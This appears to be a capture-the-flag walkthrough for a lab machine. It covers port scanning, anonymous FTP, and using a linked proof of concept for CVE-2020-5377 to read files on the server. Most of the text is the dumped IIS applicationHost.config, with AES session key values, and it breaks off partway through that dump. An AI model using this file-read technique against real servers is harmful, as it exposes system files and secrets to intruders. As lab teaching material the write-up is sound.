# Hack-smarter-security
Hack Smarter security walkthrough

# Challenge Description

Your mission is to infiltrate the web server of the notorious Hack Smarter 
APT (Advanced Persistent Threat) group. This group is known for 
conducting malicious cyber activities, and it's imperative that we 
gather intel on their upcoming targets.

## Enumeration

- Let’s start off with an nmap scan :
- ![Screenshot 2024-05-03 142221](https://github.com/user-attachments/assets/da291aca-94cf-4042-ba51-04678ef1e41f)
We can see the open port and services, which revealed five ports open.

Tried snooping around the ftp service and discovered the ftp anonymous login was enabled.
![Screenshot 2024-05-03 142636](https://github.com/user-attachments/assets/6c5f47a0-6b6d-42e5-85a6-4dba4aaba93d)

Looking at port 1311, we see Dell OpenManage Server Administrator running:

![Screenshot_2024-05-03_14_28_52](https://github.com/user-attachments/assets/901e7ced-f2d7-4e63-92ba-ca28cf626943)

Discovered this service was vulnerable to  CVE-2020-5377 (`Arbitrary File Read)`

This [exploit](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2020-5377_CVE-2021-21514) that will help us read files on the target. Alternatively you can use  [this article](https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/) for a detailed explanation on the vulnerability and how a fix was implemented.

Running the POC exploit code, we go access to the server:
![Screenshot 2024-05-03 144312](https://github.com/user-attachments/assets/f883bd0c-fb21-4558-a2d3-12aa49c2577a)
Now, it is time to get to the juicy part which is finding credentials on the web server. applicationHost.config is the root file of the configuration system when you are using IIS 7 and above, so let us  try to read the applicationHost.config file to get the general configuration for the IIS. 
The location of the file is currently in the %windir%\system32\inetsrv\config directory.


file > /windows/system32/inetsrv/config/applicationHost.config
Reading contents of /windows/system32/inetsrv/config/applicationHost.config:
<?xml version="1.0" encoding="UTF-8"?>
<!--

    IIS configuration sections.

    For schema documentation, see
    %windir%\system32\inetsrv\config\schema\IIS_schema.xml.

    Please make a backup of this file before making any changes to it.

-->

<configuration>

    <!--

        The <configSections> section controls the registration of sections.
        Section is the basic unit of deployment, locking, searching and
        containment for configuration settings.

        Every section belongs to one section group.
        A section group is a container of logically-related sections.

        Sections cannot be nested.
        Section groups may be nested.

        <section
            name=""  [Required, Collection Key] [XML name of the section]
            allowDefinition="Everywhere" [MachineOnly|MachineToApplication|AppHostOnly|Everywhere] [Level where it can be set]
            overrideModeDefault="Allow"  [Allow|Deny] [Default delegation mode]
            allowLocation="true"  [true|false] [Allowed in location tags]
        />

        The recommended way to unlock sections is by using a location tag:
        <location path="Default Web Site" overrideMode="Allow">
            <system.webServer>
                <asp />
            </system.webServer>
        </location>

    -->
    <configSections>
        <sectionGroup name="system.applicationHost">
            <section name="applicationPools" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="configHistory" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="customMetadata" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="listenerAdapters" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="log" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="serviceAutoStartProviders" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="sites" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="webLimits" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
        </sectionGroup>

        <sectionGroup name="system.webServer">
            <section name="asp" overrideModeDefault="Deny" />
            <section name="caching" overrideModeDefault="Allow" />
            <section name="cgi" overrideModeDefault="Deny" />
            <section name="defaultDocument" overrideModeDefault="Allow" />
            <section name="directoryBrowse" overrideModeDefault="Allow" />
            <section name="fastCgi" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="globalModules" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="handlers" overrideModeDefault="Deny" />
            <section name="httpCompression" overrideModeDefault="Allow" />
            <section name="httpErrors" overrideModeDefault="Allow" />
            <section name="httpLogging" overrideModeDefault="Deny" />
            <section name="httpProtocol" overrideModeDefault="Allow" />
            <section name="httpRedirect" overrideModeDefault="Allow" />
            <section name="httpTracing" overrideModeDefault="Deny" />
            <section name="isapiFilters" allowDefinition="MachineToApplication" overrideModeDefault="Deny" />
            <section name="modules" allowDefinition="MachineToApplication" overrideModeDefault="Deny" />
            <section name="applicationInitialization" allowDefinition="MachineToApplication" overrideModeDefault="Allow" />
            <section name="odbcLogging" overrideModeDefault="Deny" />
            <sectionGroup name="security">
                <section name="access" overrideModeDefault="Deny" />
                <section name="applicationDependencies" overrideModeDefault="Deny" />
                <sectionGroup name="authentication">
                    <section name="anonymousAuthentication" overrideModeDefault="Deny" />
                    <section name="basicAuthentication" overrideModeDefault="Deny" />
                    <section name="clientCertificateMappingAuthentication" overrideModeDefault="Deny" />
                    <section name="digestAuthentication" overrideModeDefault="Deny" />
                    <section name="iisClientCertificateMappingAuthentication" overrideModeDefault="Deny" />
                    <section name="windowsAuthentication" overrideModeDefault="Deny" />
                </sectionGroup>
                <section name="authorization" overrideModeDefault="Allow" />
                <section name="ipSecurity" overrideModeDefault="Deny" />
                <section name="dynamicIpSecurity" overrideModeDefault="Deny" />
                <section name="isapiCgiRestriction" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
                <section name="requestFiltering" overrideModeDefault="Allow" />
            </sectionGroup>
            <section name="serverRuntime" overrideModeDefault="Deny" />
            <section name="serverSideInclude" overrideModeDefault="Deny" />
            <section name="staticContent" overrideModeDefault="Allow" />
            <sectionGroup name="tracing">
                <section name="traceFailedRequests" overrideModeDefault="Allow" />
                <section name="traceProviderDefinitions" overrideModeDefault="Deny" />
            </sectionGroup>
            <section name="urlCompression" overrideModeDefault="Allow" />
            <section name="validation" overrideModeDefault="Allow" />
            <sectionGroup name="webdav">
                <section name="globalSettings" overrideModeDefault="Deny" />
                <section name="authoring" overrideModeDefault="Deny" />
                <section name="authoringRules" overrideModeDefault="Deny" />
            </sectionGroup>
            <section name="webSocket" overrideModeDefault="Deny" />
        </sectionGroup>
        <sectionGroup name="system.ftpServer">
            <section name="log" overrideModeDefault="Deny" allowDefinition="AppHostOnly" />
            <section name="firewallSupport" overrideModeDefault="Deny" allowDefinition="AppHostOnly" />
            <section name="caching" overrideModeDefault="Deny" allowDefinition="AppHostOnly" />
            <section name="providerDefinitions" overrideModeDefault="Deny" />
            <sectionGroup name="security">
                <section name="ipSecurity" overrideModeDefault="Deny" />
                <section name="requestFiltering" overrideModeDefault="Deny" />
                <section name="authorization" overrideModeDefault="Deny" />
                <section name="authentication" overrideModeDefault="Deny" />
            </sectionGroup>
            <section name="serverRuntime" overrideModeDefault="Deny" allowDefinition="AppHostOnly" />
        </sectionGroup>
    </configSections>

    <configProtectedData>
        <providers>
            <add name="IISWASOnlyRsaProvider" type="" description="Uses RsaCryptoServiceProvider to encrypt and decrypt" keyContainerName="iisWasKey" cspProviderName="" useMachineContainer="true" useOAEP="false" />
            <add name="IISCngProvider" type="Microsoft.ApplicationHost.CngProtectedConfigurationProvider" description="Uses Win32 Crypto CNG to encrypt and decrypt" keyContainerName="iisCngConfigurationKey" useMachineContainer="true" />
            <add name="IISWASOnlyCngProvider" type="Microsoft.ApplicationHost.CngProtectedConfigurationProvider" description="(WAS Only) Uses Win32 Crypto CNG to encrypt and decrypt" keyContainerName="iisCngWasKey" useMachineContainer="true" />
            <add name="AesProvider" type="Microsoft.ApplicationHost.AesProtectedConfigurationProvider" description="Uses an AES session key to encrypt and decrypt" keyContainerName="iisConfigurationKey" cspProviderName="" useOAEP="false" useMachineContainer="true" sessionKey="AQIAAA5mAAAApAAAMXVoZzljV8nMixj5wAVkhdu0ZHzH0L0FO8BTgdFkl2CbXD2eFMhWi0vb+AR6VUrvCCjKf+LzvWRKnGoz812ACweT3/ZPrcIh+Ef24nSvl6TQTcq5EI4jQgQRRhZ90+OofCAutPXcOZNVLjIlZgJjQgP07e3xrtVijkhSS3j4T1xsuE3YaWiMwCDEzxUPr2cHtLRYQxkDSvyPpvoLtab8VLH/aa90OuYx6z7o8n2332trJBC8rRNCNFI3UrsUuzASouD+3BwJTliDXCO3ozHgr1VgBaKB2vOSfiW+HZbImo9/WgRmSHC6FtGWqkhMxACOnp0vc3pRvPF/TQtjf9vpCA==" />
            <add name="IISWASOnlyAesProvider" type="Microsoft.ApplicationHost.AesProtectedConfigurationProvider" description="Uses an AES session key to encrypt and decrypt" keyContainerName="iisWasKey" cspProviderName="" useOAEP="false" useMachineContainer="true" sessionKey="AQIAAA5mAAAApAAARMxzOPMhM9dK68CJAUfppvnrJoKq10wpgKSfoeTwZlOwBE1K2kmEB/PUK6omNDZnbBlGlrkOX0hkf9EE1ZVl2oEqHOa0b6V2/4nzFssq/WvUvkM3QpkacJRr8oD2l6u6TABWvaMMDCABjJkWPhYi3XENdJYPl62S+GuGqVBAXUY52//ZDWp4Z+AoDYpH254ZGkt8fbBAThMGsyuewmluQJQq3uPN3D/I6uXceSFYKQH8sb8uK1zGZV7p2+6WEW5mF2DKXG+5WdDP+Si/UA8frR30O0vNOh/fReLHgCeMdUsf/XW5cB+CkGmipA1p4nCs591Md7d7Ge9ypUufCo1ueQ==" />
        </providers>
    </configProtectedData>

    <system.applicationHost>

        <applicationPools>
            <add name="DefaultAppPool" />
            <add name="hacksmartersec" />
            <applicationPoolDefaults managedRuntimeVersion="v4.0">
                <processModel identityType="ApplicationPoolIdentity" />
            </applicationPoolDefaults>
        </applicationPools>

        <!--

          The <customMetadata> section is used internally by the Admin Base Objects
          (ABO) Compatibility component. Please do not modify its content.

        -->
        <customMetadata />

        <!--

          The <listenerAdapters> section defines the protocols with which the
          Windows Process Activation Service (WAS) binds.

        -->
        <listenerAdapters>
            <add name="http" />
        </listenerAdapters>

        <log>
            <centralBinaryLogFile enabled="true" directory="%SystemDrive%\inetpub\logs\LogFiles" />
            <centralW3CLogFile enabled="true" directory="%SystemDrive%\inetpub\logs\LogFiles" />
        </log>

        <sites>
            <site name="hacksmartersec" id="2" serverAutoStart="true">
                <application path="/" applicationPool="hacksmartersec">
                    <virtualDirectory path="/" physicalPath="C:\inetpub\wwwroot\hacksmartersec" />
                </application>
                <bindings>
                    <binding protocol="http" bindingInformation="*:80:" />
                </bindings>
            </site>
            <site name="data-leaks" id="1">
                <application path="/">
                    <virtualDirectory path="/" physicalPath="C:\inetpub\ftproot" />
                </application>
                <bindings>
                    <binding protocol="ftp" bindingInformation="*:21:" />
                </bindings>
                <ftpServer>
                    <security>
                        <ssl controlChannelPolicy="SslAllow" dataChannelPolicy="SslAllow" />
                    </security>
                </ftpServer>
            </site>
            <siteDefaults>
                <logFile logFormat="W3C" directory="%SystemDrive%\inetpub\logs\LogFiles" />
                <traceFailedRequestsLogging directory="%SystemDrive%\inetpub\logs\FailedReqLogFiles" />
                <ftpServer>
                    <security>
                        <authentication>
                            <anonymousAuthentication enabled="true" />
                        </authentication>
                    </security>
                </ftpServer>
            </siteDefaults>
            <applicationDefaults applicationPool="DefaultAppPool" />
            <virtualDirectoryDefaults allowSubDirConfig="true" />
        </sites>

        <webLimits />

    </system.applicationHost>

    <system.webServer>

        <asp />

        <caching enabled="true" enableKernelCache="true">
        </caching>

        <cgi />

        <defaultDocument enabled="true">
            <files>
                <add value="Default.htm" />
                <add value="Default.asp" />
                <add value="index.htm" />
                <add value="index.html" />
                <add value="iisstart.htm" />
            </files>
        </defaultDocument>

        <directoryBrowse enabled="false" />

        <fastCgi />

        <!--

          The <globalModules> section defines all native-code modules.
          To enable a module, specify it in the <modules> section.

        -->
        <globalModules>
            <add name="HttpLoggingModule" image="%windir%\System32\inetsrv\loghttp.dll" />
            <add name="UriCacheModule" image="%windir%\System32\inetsrv\cachuri.dll" />
            <add name="FileCacheModule" image="%windir%\System32\inetsrv\cachfile.dll" />
            <add name="TokenCacheModule" image="%windir%\System32\inetsrv\cachtokn.dll" />
            <add name="HttpCacheModule" image="%windir%\System32\inetsrv\cachhttp.dll" />
            <add name="StaticCompressionModule" image="%windir%\System32\inetsrv\compstat.dll" />
            <add name="DefaultDocumentModule" image="%windir%\System32\inetsrv\defdoc.dll" />
            <add name="DirectoryListingModule" image="%windir%\System32\inetsrv\dirlist.dll" />
            <add name="ProtocolSupportModule" image="%windir%\System32\inetsrv\protsup.dll" />
            <add name="StaticFileModule" image="%windir%\System32\inetsrv\static.dll" />
            <add name="AnonymousAuthenticationModule" image="%windir%\System32\inetsrv\authanon.dll" />
            <add name="RequestFilteringModule" image="%windir%\System32\inetsrv\modrqflt.dll" />
            <add name="CustomErrorModule" image="%windir%\System32\inetsrv\custerr.dll" />
        </globalModules>

        <handlers accessPolicy="Read, Script">
            <add name="TRACEVerbHandler" path="*" verb="TRACE" modules="ProtocolSupportModule" requireAccess="None" />
            <add name="OPTIONSVerbHandler" path="*" verb="OPTIONS" modules="ProtocolSupportModule" requireAccess="None" />
            <add name="StaticFile" path="*" verb="*" modules="StaticFileModule,DefaultDocumentModule,DirectoryListingModule" resourceType="Either" requireAccess="Read" />
        </handlers>

        <httpCompression directory="%SystemDrive%\inetpub\temp\IIS Temporary Compressed Files">
            <scheme name="gzip" dll="%Windir%\system32\inetsrv\gzip.dll" />
            <staticTypes>
                <add mimeType="text/*" enabled="true" />
                <add mimeType="message/*" enabled="true" />
                <add mimeType="application/javascript" enabled="true" />
                <add mimeType="application/atom+xml" enabled="true" />
                <add mimeType="application/xaml+xml" enabled="true" />
                <add mimeType="image/svg+xml" enabled="true" />
                <add mimeType="*/*" enabled="false" />
            </staticTypes>
        </httpCompression>

        <httpErrors lockAttributes="allowAbsolutePathsWhenDelegated,defaultPath">
            <error statusCode="401" prefixLanguageFilePath="%SystemDrive%\inetpub\custerr" path="401.htm" />
            <error statusCode="403" prefixLanguageFilePath="%SystemDrive%\inetpub\custerr" path="403.htm" />
            <error statusCode="404" prefixLanguageFilePath="%SystemDrive%\inetpub\custerr" path="404.htm" />
            <error statusCode="405" prefixLanguageFilePath="%SystemDrive%\inetpub\custerr" path="405.htm" />
            <error statusCode="406" prefixLanguageFilePath="%SystemDrive%\inetpub\custerr" path="406.htm" />
            <error statusCode="412" prefixLanguageFilePath="%SystemDrive%\inetpub\custerr" path="412.htm" />
            <error statusCode="500" prefixLanguageFilePath="%SystemDrive%\inetpub\custerr" path="500.htm" />
            <error statusCode="501" prefixLanguageFilePath="%SystemDrive%\inetpub\custerr" path="501.htm" />
            <error statusCode="502" prefixLanguageFilePath="%SystemDrive%\inetpub\custerr" path="502.htm" />
        </httpErrors>

        <httpLogging dontLog="false" />

        <httpProtocol>
            <customHeaders>
                <clear />
            </customHeaders>
            <redirectHeaders>
                <clear />
            </redirectHeaders>
        </httpProtocol>

        <httpRedirect />

        <httpTracing />

        <isapiFilters />

        <modules>
            <add name="HttpLoggingModule" lockItem="true" />
            <add name="HttpCacheModule" lockItem="true" />
            <add name="StaticCompressionModule" lockItem="true" />
            <add name="DefaultDocumentModule" lockItem="true" />
            <add name="DirectoryListingModule" lockItem="true" />
            <add name="ProtocolSupportModule" lockItem="true" />
            <add name="StaticFileModule" lockItem="true" />
            <add name="AnonymousAuthenticationModule" lockItem="true" />
            <add name="RequestFilteringModule" lockItem="true" />
            <add name="CustomErrorModule" lockItem="true" />
        </modules>

        <odbcLogging />

        <security>

            <access sslFlags="None" />

            <applicationDependencies />

            <authentication>

                <anonymousAuthentication enabled="true" userName="IUSR" />

                <basicAuthentication />

                <clientCertificateMappingAuthentication />

                <digestAuthentication />

                <iisClientCertificateMappingAuthentication />

                <windowsAuthentication />

            </authentication>

            <authorization />

            <ipSecurity />

            <isapiCgiRestriction />

            <requestFiltering>
                <fileExtensions allowUnlisted="true" applyToWebDAV="true" />
                <verbs allowUnlisted="true" applyToWebDAV="true" />
                <hiddenSegments applyToWebDAV="true">
                    <add segment="web.config" />
                </hiddenSegments>
            </requestFiltering>

        </security>

        <serverRuntime />

        <serverSideInclude />

        <staticContent lockAttributes="isDocFooterFileName">
            <mimeMap fileExtension=".323" mimeType="text/h323" />
            <mimeMap fileExtension=".3g2" mimeType="video/3gpp2" />
            <mimeMap fileExtension=".3gp2" mimeType="video/3gpp2" />
            <mimeMap fileExtension=".3gp" mimeType="video/3gpp" />
            <mimeMap fileExtension=".3gpp" mimeType="video/3gpp" />
            <mimeMap fileExtension=".aaf" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".aac" mimeType="audio/aac" />
            <mimeMap fileExtension=".aca" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".accdb" mimeType="application/msaccess" />
            <mimeMap fileExtension=".accde" mimeType="application/msaccess" />
            <mimeMap fileExtension=".accdt" mimeType="application/msaccess" />
            <mimeMap fileExtension=".acx" mimeType="application/internet-property-stream" />
            <mimeMap fileExtension=".adt" mimeType="audio/vnd.dlna.adts" />
            <mimeMap fileExtension=".adts" mimeType="audio/vnd.dlna.adts" />
            <mimeMap fileExtension=".afm" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".ai" mimeType="application/postscript" />
            <mimeMap fileExtension=".aif" mimeType="audio/x-aiff" />
            <mimeMap fileExtension=".aifc" mimeType="audio/aiff" />
            <mimeMap fileExtension=".aiff" mimeType="audio/aiff" />
            <mimeMap fileExtension=".appcache" mimeType="text/cache-manifest" />
            <mimeMap fileExtension=".application" mimeType="application/x-ms-application" />
            <mimeMap fileExtension=".art" mimeType="image/x-jg" />
            <mimeMap fileExtension=".asd" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".asf" mimeType="video/x-ms-asf" />
            <mimeMap fileExtension=".asi" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".asm" mimeType="text/plain" />
            <mimeMap fileExtension=".asr" mimeType="video/x-ms-asf" />
            <mimeMap fileExtension=".asx" mimeType="video/x-ms-asf" />
            <mimeMap fileExtension=".atom" mimeType="application/atom+xml" />
            <mimeMap fileExtension=".au" mimeType="audio/basic" />
            <mimeMap fileExtension=".avi" mimeType="video/avi" />
            <mimeMap fileExtension=".axs" mimeType="application/olescript" />
            <mimeMap fileExtension=".bas" mimeType="text/plain" />
            <mimeMap fileExtension=".bcpio" mimeType="application/x-bcpio" />
            <mimeMap fileExtension=".bin" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".bmp" mimeType="image/bmp" />
            <mimeMap fileExtension=".c" mimeType="text/plain" />
            <mimeMap fileExtension=".cab" mimeType="application/vnd.ms-cab-compressed" />
            <mimeMap fileExtension=".calx" mimeType="application/vnd.ms-office.calx" />
            <mimeMap fileExtension=".cat" mimeType="application/vnd.ms-pki.seccat" />
            <mimeMap fileExtension=".cdf" mimeType="application/x-cdf" />
            <mimeMap fileExtension=".chm" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".class" mimeType="application/x-java-applet" />
            <mimeMap fileExtension=".clp" mimeType="application/x-msclip" />
            <mimeMap fileExtension=".cmx" mimeType="image/x-cmx" />
            <mimeMap fileExtension=".cnf" mimeType="text/plain" />
            <mimeMap fileExtension=".cod" mimeType="image/cis-cod" />
            <mimeMap fileExtension=".cpio" mimeType="application/x-cpio" />
            <mimeMap fileExtension=".cpp" mimeType="text/plain" />
            <mimeMap fileExtension=".crd" mimeType="application/x-mscardfile" />
            <mimeMap fileExtension=".crl" mimeType="application/pkix-crl" />
            <mimeMap fileExtension=".crt" mimeType="application/x-x509-ca-cert" />
            <mimeMap fileExtension=".csh" mimeType="application/x-csh" />
            <mimeMap fileExtension=".css" mimeType="text/css" />
            <mimeMap fileExtension=".csv" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".cur" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".dcr" mimeType="application/x-director" />
            <mimeMap fileExtension=".deploy" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".der" mimeType="application/x-x509-ca-cert" />
            <mimeMap fileExtension=".dib" mimeType="image/bmp" />
            <mimeMap fileExtension=".dir" mimeType="application/x-director" />
            <mimeMap fileExtension=".disco" mimeType="text/xml" />
            <mimeMap fileExtension=".dll" mimeType="application/x-msdownload" />
            <mimeMap fileExtension=".dll.config" mimeType="text/xml" />
            <mimeMap fileExtension=".dlm" mimeType="text/dlm" />
            <mimeMap fileExtension=".doc" mimeType="application/msword" />
            <mimeMap fileExtension=".docm" mimeType="application/vnd.ms-word.document.macroEnabled.12" />
            <mimeMap fileExtension=".docx" mimeType="application/vnd.openxmlformats-officedocument.wordprocessingml.document" />
            <mimeMap fileExtension=".dot" mimeType="application/msword" />
            <mimeMap fileExtension=".dotm" mimeType="application/vnd.ms-word.template.macroEnabled.12" />
            <mimeMap fileExtension=".dotx" mimeType="application/vnd.openxmlformats-officedocument.wordprocessingml.template" />
            <mimeMap fileExtension=".dsp" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".dtd" mimeType="text/xml" />
            <mimeMap fileExtension=".dvi" mimeType="application/x-dvi" />
            <mimeMap fileExtension=".dvr-ms" mimeType="video/x-ms-dvr" />
            <mimeMap fileExtension=".dwf" mimeType="drawing/x-dwf" />
            <mimeMap fileExtension=".dwp" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".dxr" mimeType="application/x-director" />
            <mimeMap fileExtension=".eml" mimeType="message/rfc822" />
            <mimeMap fileExtension=".emz" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".eot" mimeType="application/vnd.ms-fontobject" />
            <mimeMap fileExtension=".eps" mimeType="application/postscript" />
            <mimeMap fileExtension=".esd" mimeType="application/vnd.ms-cab-compressed" />
            <mimeMap fileExtension=".etx" mimeType="text/x-setext" />
            <mimeMap fileExtension=".evy" mimeType="application/envoy" />
            <mimeMap fileExtension=".exe" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".exe.config" mimeType="text/xml" />
            <mimeMap fileExtension=".fdf" mimeType="application/vnd.fdf" />
            <mimeMap fileExtension=".fif" mimeType="application/fractals" />
            <mimeMap fileExtension=".fla" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".flr" mimeType="x-world/x-vrml" />
            <mimeMap fileExtension=".flv" mimeType="video/x-flv" />
            <mimeMap fileExtension=".gif" mimeType="image/gif" />
            <mimeMap fileExtension=".glb" mimeType="model/gltf-binary" />
            <mimeMap fileExtension=".gtar" mimeType="application/x-gtar" />
            <mimeMap fileExtension=".gz" mimeType="application/x-gzip" />
            <mimeMap fileExtension=".h" mimeType="text/plain" />
            <mimeMap fileExtension=".hdf" mimeType="application/x-hdf" />
            <mimeMap fileExtension=".hdml" mimeType="text/x-hdml" />
            <mimeMap fileExtension=".hhc" mimeType="application/x-oleobject" />
            <mimeMap fileExtension=".hhk" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".hhp" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".hlp" mimeType="application/winhlp" />
            <mimeMap fileExtension=".hqx" mimeType="application/mac-binhex40" />
            <mimeMap fileExtension=".hta" mimeType="application/hta" />
            <mimeMap fileExtension=".htc" mimeType="text/x-component" />
            <mimeMap fileExtension=".htm" mimeType="text/html" />
            <mimeMap fileExtension=".html" mimeType="text/html" />
            <mimeMap fileExtension=".htt" mimeType="text/webviewhtml" />
            <mimeMap fileExtension=".hxt" mimeType="text/html" />
            <mimeMap fileExtension=".ico" mimeType="image/x-icon" />
            <mimeMap fileExtension=".ics" mimeType="text/calendar" />
            <mimeMap fileExtension=".ief" mimeType="image/ief" />
            <mimeMap fileExtension=".iii" mimeType="application/x-iphone" />
            <mimeMap fileExtension=".inf" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".ins" mimeType="application/x-internet-signup" />
            <mimeMap fileExtension=".isp" mimeType="application/x-internet-signup" />
            <mimeMap fileExtension=".IVF" mimeType="video/x-ivf" />
            <mimeMap fileExtension=".jar" mimeType="application/java-archive" />
            <mimeMap fileExtension=".java" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".jck" mimeType="application/liquidmotion" />
            <mimeMap fileExtension=".jcz" mimeType="application/liquidmotion" />
            <mimeMap fileExtension=".jfif" mimeType="image/pjpeg" />
            <mimeMap fileExtension=".jpb" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".jpe" mimeType="image/jpeg" />
            <mimeMap fileExtension=".jpeg" mimeType="image/jpeg" />
            <mimeMap fileExtension=".jpg" mimeType="image/jpeg" />
            <mimeMap fileExtension=".js" mimeType="application/javascript" />
            <mimeMap fileExtension=".json" mimeType="application/json" />
            <mimeMap fileExtension=".jsonld" mimeType="application/ld+json" />
            <mimeMap fileExtension=".jsx" mimeType="text/jscript" />
            <mimeMap fileExtension=".latex" mimeType="application/x-latex" />
            <mimeMap fileExtension=".less" mimeType="text/css" />
            <mimeMap fileExtension=".lit" mimeType="application/x-ms-reader" />
            <mimeMap fileExtension=".lpk" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".lsf" mimeType="video/x-la-asf" />
            <mimeMap fileExtension=".lsx" mimeType="video/x-la-asf" />
            <mimeMap fileExtension=".lzh" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".m13" mimeType="application/x-msmediaview" />
            <mimeMap fileExtension=".m14" mimeType="application/x-msmediaview" />
            <mimeMap fileExtension=".m1v" mimeType="video/mpeg" />
            <mimeMap fileExtension=".m2ts" mimeType="video/vnd.dlna.mpeg-tts" />
            <mimeMap fileExtension=".m3u" mimeType="audio/x-mpegurl" />
            <mimeMap fileExtension=".m4a" mimeType="audio/mp4" />
            <mimeMap fileExtension=".m4v" mimeType="video/mp4" />
            <mimeMap fileExtension=".man" mimeType="application/x-troff-man" />
            <mimeMap fileExtension=".manifest" mimeType="application/x-ms-manifest" />
            <mimeMap fileExtension=".map" mimeType="text/plain" />
            <mimeMap fileExtension=".mdb" mimeType="application/x-msaccess" />
            <mimeMap fileExtension=".mdp" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".me" mimeType="application/x-troff-me" />
            <mimeMap fileExtension=".mht" mimeType="message/rfc822" />
            <mimeMap fileExtension=".mhtml" mimeType="message/rfc822" />
            <mimeMap fileExtension=".mid" mimeType="audio/mid" />
            <mimeMap fileExtension=".midi" mimeType="audio/mid" />
            <mimeMap fileExtension=".mix" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".mmf" mimeType="application/x-smaf" />
            <mimeMap fileExtension=".mno" mimeType="text/xml" />
            <mimeMap fileExtension=".mny" mimeType="application/x-msmoney" />
            <mimeMap fileExtension=".mov" mimeType="video/quicktime" />
            <mimeMap fileExtension=".movie" mimeType="video/x-sgi-movie" />
            <mimeMap fileExtension=".mp2" mimeType="video/mpeg" />
            <mimeMap fileExtension=".mp3" mimeType="audio/mpeg" />
            <mimeMap fileExtension=".mp4" mimeType="video/mp4" />
            <mimeMap fileExtension=".mp4v" mimeType="video/mp4" />
            <mimeMap fileExtension=".mpa" mimeType="video/mpeg" />
            <mimeMap fileExtension=".mpe" mimeType="video/mpeg" />
            <mimeMap fileExtension=".mpeg" mimeType="video/mpeg" />
            <mimeMap fileExtension=".mpg" mimeType="video/mpeg" />
            <mimeMap fileExtension=".mpp" mimeType="application/vnd.ms-project" />
            <mimeMap fileExtension=".mpv2" mimeType="video/mpeg" />
            <mimeMap fileExtension=".ms" mimeType="application/x-troff-ms" />
            <mimeMap fileExtension=".msi" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".mso" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".mvb" mimeType="application/x-msmediaview" />
            <mimeMap fileExtension=".mvc" mimeType="application/x-miva-compiled" />
            <mimeMap fileExtension=".nc" mimeType="application/x-netcdf" />
            <mimeMap fileExtension=".nsc" mimeType="video/x-ms-asf" />
            <mimeMap fileExtension=".nws" mimeType="message/rfc822" />
            <mimeMap fileExtension=".ocx" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".oda" mimeType="application/oda" />
            <mimeMap fileExtension=".odc" mimeType="text/x-ms-odc" />
            <mimeMap fileExtension=".ods" mimeType="application/oleobject" />
            <mimeMap fileExtension=".oga" mimeType="audio/ogg" />
            <mimeMap fileExtension=".ogg" mimeType="video/ogg" />
            <mimeMap fileExtension=".ogv" mimeType="video/ogg" />
            <mimeMap fileExtension=".one" mimeType="application/onenote" />
            <mimeMap fileExtension=".onea" mimeType="application/onenote" />
            <mimeMap fileExtension=".onetoc" mimeType="application/onenote" />
            <mimeMap fileExtension=".onetoc2" mimeType="application/onenote" />
            <mimeMap fileExtension=".onetmp" mimeType="application/onenote" />
            <mimeMap fileExtension=".onepkg" mimeType="application/onenote" />
            <mimeMap fileExtension=".osdx" mimeType="application/opensearchdescription+xml" />
            <mimeMap fileExtension=".otf" mimeType="font/otf" />
            <mimeMap fileExtension=".p10" mimeType="application/pkcs10" />
            <mimeMap fileExtension=".p12" mimeType="application/x-pkcs12" />
            <mimeMap fileExtension=".p7b" mimeType="application/x-pkcs7-certificates" />
            <mimeMap fileExtension=".p7c" mimeType="application/pkcs7-mime" />
            <mimeMap fileExtension=".p7m" mimeType="application/pkcs7-mime" />
            <mimeMap fileExtension=".p7r" mimeType="application/x-pkcs7-certreqresp" />
            <mimeMap fileExtension=".p7s" mimeType="application/pkcs7-signature" />
            <mimeMap fileExtension=".pbm" mimeType="image/x-portable-bitmap" />
            <mimeMap fileExtension=".pcx" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".pcz" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".pdf" mimeType="application/pdf" />
            <mimeMap fileExtension=".pfb" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".pfm" mimeType="application/octet-stream" />
            <mimeMap fileExtension=".pfx" mimeType="application/x-pkcs12" />
            <mimeMap fileExtension=".pgm" mimeType="image/x-portable-graymap" />
            <mimeMap fileExtension=".pko" mimeType="application/vnd.ms-pki.pko" />
            <mimeMap fileExtension=".pma" mimeType="application/x-perfmon" />
            <mimeMap fileExtension=".pmc" mimeType="application/x-perfmon" />
            <mimeMap fileExtension=".pml" mimeType="application/x-perfmon" />
